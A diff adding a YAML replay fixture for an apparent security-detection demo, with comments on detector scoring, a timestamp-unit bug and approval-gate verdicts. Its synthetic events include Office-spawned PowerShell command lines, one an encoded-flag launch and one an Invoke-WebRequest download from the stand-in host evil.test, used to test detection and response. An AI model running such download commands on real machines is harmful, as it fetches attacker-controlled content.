@@ -1,0 +1,140 @@
+# hellcat-office-demo.yaml -- the Perch demo's replay scenario.
+#
+# HOW TO USE IT
+#   cp docs/plans/ambush-ui/build/fixtures/scenario/hellcat-office-demo.yaml scenarios/
+#   swarmctl first-run --scenario scenarios/hellcat-office-demo.yaml --pace-ms 900
+#
+# `swarmctl first-run` with NO --scenario runs built_in_first_run_scenario()
+# (crates/swarm-ingest-runtime/src/ingest/demo.rs:500-511), a ONE-event builtin
+# on host `host-first-run`. That builtin cannot tell this story: one event gives
+# one threat class 1.8 total_strength across two detectors, which is under
+# alert_threshold 2.0, so nothing escalates and nothing correlates.
+#
+# WHAT THIS IS
+#   scenarios/office-dropper-correlation.yaml, byte-for-byte in `input.events`
+#   except for the two `timestamp` values and the `host_id` prefix, with the
+#   metadata block widened and the same `expectations` asserted.
+#
+# THE ONE DELIBERATE DEPARTURE, AND WHY
+#   The shipped scenario stamps `timestamp: 1700000000000` -- MILLISECONDS.
+#   PheromoneDeposit.timestamp is fed straight from TelemetryEvent.timestamp
+#   (crates/swarm-runtime/src/detection/pipeline.rs:571, resolve_deposits, in
+#   swarm_detect --serve), and PheromoneDeposit::strength_at compares it against
+#   a `now` that the concentration monitor produces with unix_timestamp_secs()
+#   (crates/swarm-runtime/src/escalation.rs:407-410). With a millisecond
+#   timestamp, `now <= self.timestamp` is true forever, strength_at takes the
+#   early return at crates/swarm-core/src/pheromone.rs:282-284, and every deposit
+#   sits at full confidence for the life of the process: the decay curve is flat
+#   and the evaporation threshold is unreachable.
+#
+#   That is invisible in a pass/fail replay assertion and extremely visible on a
+#   concentration chart, so this fixture stamps SECONDS. Change nothing else.
+#   See 22-DEMO-FIXTURE.md finding F-3.
+#
+# WHAT THE TWO EVENTS PRODUCE, in order, against the shipped default ruleset:
+#   evt-1  WINWORD -> powershell -enc            2 findings, 2 deposits, 1.7997 total
+#   evt-2  OUTLOOK -> powershell Invoke-WebRequest 1 finding,  1 deposit,  2.6969 total  <- crosses
+#
+name: hellcat_office_demo
+description: Two Office-spawned PowerShell chains on one workstation cross alert_threshold together and correlate into one incident
+# 2026-03-17T09:14:30Z. Milliseconds -- seed_time_ms is a run identifier
+# (replay_run:{name}:{seed_time_ms}), not a substrate clock.
+seed_time_ms: 1773738870000
+requested_by: replay-whisker
+receipt_chain:
+  - seed-receipt
+metadata:
+  class: adversarial
+  threat_class: execution
+  campaign: hellcat.office_loader
+  techniques:
+    - T1204.002
+    - T1059.001
+    - T1105
+  tags:
+    - office
+    - correlation
+    - loader
+    - perch-demo
+
+input:
+  kind: events
+  events:
+    # 2026-03-17T09:14:32Z, in SECONDS. Detected by BOTH suspicious_process_tree
+    # (WINWORD is in default_suspicious_parents, powershell in
+    # default_suspicious_children, `-enc` sets has_encoded_flag ->
+    # confidence 0.9, Severity::Critical -- crates/swarm-whisker/src/detector.rs:159-215)
+    # and suspicious_scripting (is_powershell && "-enc" is in
+    # default_encoded_indicators -> encoded -> confidence 0.9, Severity::Critical
+    # -- crates/swarm-whisker/src/suspicious_scripting.rs:111-180).
+    - action:
+        type: isolate_host
+        host_id: host-ops-1
+      event:
+        source: synthetic
+        event_id: hunt-evt-1
+        timestamp: 1773738872
+        host_id: host-ops-1
+        payload:
+          kind: process_start
+          parent_process: WINWORD
+          process_name: powershell
+          command_line: powershell.exe -enc AAA=
+          user: alice
+    # 2026-03-17T09:14:41Z. Detected by suspicious_process_tree ONLY:
+    # has_download_hint fires on "https://" -> 0.9 / Critical. suspicious_scripting
+    # does NOT fire -- "invoke-webrequest" is in default_download_execute_indicators
+    # but the download_execute arm additionally requires one of
+    # iex / invoke-expression / start-process / cmd /c / cmd.exe /c
+    # (crates/swarm-whisker/src/suspicious_scripting.rs:126-133) and this command
+    # line has none, `powershell` is not in default_lolbin_processes, and there is
+    # no encoded flag. That asymmetry is the point: the second event adds ONE
+    # deposit, not two, and the crossing is 0.9 + 0.9 + 0.9 minus decay.
+    - action:
+        type: block_egress
+        target: 198.51.100.20
+      event:
+        source: synthetic
+        event_id: hunt-evt-2
+        timestamp: 1773738881
+        host_id: host-ops-1
+        payload:
+          kind: process_start
+          parent_process: OUTLOOK
+          process_name: powershell
+          command_line: powershell.exe Invoke-WebRequest https://evil.test
+          user: alice
+
+expectations:
+  replay_bundle_count: 2
+  investigation_count: 2
+  incident_count: 1
+  # Both verdicts are require_human because ConfigurableApprovalGate never even
+  # consults its rules here: threat_class_from_request reads
+  # request.evidence["escalation"]["threat_class"] then request.evidence["threat_class"]
+  # (crates/swarm-policy/src/configurable_gate.rs:34-41), and the evidence on this
+  # path is the DETECTOR's evidence blob
+  # (crates/swarm-runtime/src/service/runtime_service.rs:394), which carries neither
+  # key. threat_class is None, the rule loop is skipped entirely
+  # (configurable_gate.rs:143-144), and StaticApprovalGate::evaluate decides:
+  # destructive && severity >= human_gate_severity(HIGH) -> RequireHuman.
+  #
+  # `response_kind: success` holds only in RuntimeMode::DetectOnly, where
+  # RequireHuman falls through and dry-runs. Under LiveResponse the runtime
+  # returns AuditResponseRecord::Skipped (crates/swarm-runtime/src/lib.rs:1133-1146)
+  # -- which is exactly the refusal B1 replaces with a durable hold. Run the demo
+  # in LiveResponse; run this assertion in DetectOnly.
+  hunts:
+    - hunt_id: hunt-evt-1
+      action_kind: isolate_host
+      policy_verdict: require_human
+      response_kind: success
+    - hunt_id: hunt-evt-2
+      action_kind: block_egress
+      policy_verdict: require_human
+      response_kind: success
+  incident_hunt_groups:
+    - [hunt-evt-1, hunt-evt-2]
+  max_detect_latency_us: 50000
+  max_policy_latency_us: 50000
+  max_response_latency_us: 50000
